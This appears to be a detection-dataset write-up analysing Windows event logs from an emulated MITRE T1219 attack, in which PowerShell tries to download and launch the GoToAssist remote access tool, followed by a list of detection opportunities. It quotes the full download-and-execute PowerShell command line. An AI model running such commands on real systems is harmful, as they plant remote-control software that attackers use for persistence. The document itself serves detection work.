# T1219-4: Remote Access Tools — GoToAssist Files Detected Test on Windows

## Technique Context

T1219 (Remote Access Tools) represents adversary use of legitimate remote access tools to maintain persistence and command-and-control capabilities within victim environments. GoToAssist is a legitimate commercial remote support tool that attackers frequently abuse due to its trusted reputation and ability to bypass security controls. The detection community focuses on identifying suspicious downloads of remote access tools, unexpected network connections to remote access services, and execution patterns that deviate from legitimate administrative use. This technique is particularly challenging because it leverages software that organizations may legitimately use, requiring behavioral analysis rather than simple signature-based detection.

## What This Dataset Contains

The dataset captures a PowerShell-based attempt to download and execute GoToAssist. The core activity is visible in Security EID 4688, which shows PowerShell spawning with the command line: `"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Lfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"`.

PowerShell EID 4103 and 4104 events show the attempted execution of `Invoke-WebRequest` with parameters targeting the GoToAssist download URL and subsequent `Start-Process` attempts. However, PowerShell EID 4100 error events reveal the technique failed: "Could not find a part of the path 'C:\Users\ACME-WS02$\Downloads\GoToAssist.exe'" and "This command cannot be run due to the error: The system cannot find the file specified."

Sysmon captures the process creation chain through EID 1 events showing `whoami.exe` execution and PowerShell spawning. Multiple Sysmon EID 7 events document DLL loading including urlmon.dll, which supports the web request functionality. Sysmon EID 10 shows process access events indicating PowerShell's interaction with spawned processes.

## What This Dataset Does Not Contain

The dataset lacks the actual GoToAssist binary download since the technique failed due to the non-existent Downloads directory for the machine account (ACME-WS02$). There are no network connection events (Sysmon EID 3) showing the actual web request to launch.getgo.com, suggesting the download never initiated successfully. The dataset also lacks any file creation events for the GoToAssist.exe binary or registry modifications that would accompany successful remote access tool installation. Windows Defender appears to have allowed the PowerShell execution attempt, as there's no evidence of blocking in the telemetry.

## Assessment

This dataset provides excellent telemetry for detecting attempted downloads of remote access tools through PowerShell, particularly the command-line patterns and PowerShell script block logging. The failure mode actually enhances the dataset's educational value by showing both the attempt telemetry and the error conditions that can occur. Security EID 4688 with command-line auditing captures the full attack vector including the suspicious GoToAssist URL with authentication token. PowerShell logging (EIDs 4103, 4104) provides granular visibility into the cmdlet execution and parameters. The Sysmon process creation and image load events offer additional context for behavioral detection. While the technique failure limits network and file-based detections, the process and command-line telemetry is comprehensive for building detections around remote access tool deployment attempts.

## Detection Opportunities Present in This Data

1. **PowerShell command line containing GoToAssist download URLs** - Security EID 4688 captures the full command line with "launch.getgo.com/launcher2/helper" indicating GoToAssist download attempts
2. **Invoke-WebRequest targeting remote access tool domains** - PowerShell EID 4103 shows Invoke-WebRequest with suspicious GoToAssist URLs containing authentication tokens
3. **PowerShell script blocks containing remote access tool deployment logic** - PowerShell EID 4104 captures the complete script attempting to download and execute GoToAssist
4. **Suspicious file paths for remote access tools** - Command lines and PowerShell events reference "GoToAssist.exe" in Downloads directories
5. **PowerShell spawning with encoded or obfuscated remote access commands** - The complex URL structure with tokens suggests potential evasion techniques
6. **Process creation patterns indicative of remote access tool deployment** - Sysmon EID 1 shows PowerShell spawning specifically for remote tool execution rather than administrative tasks
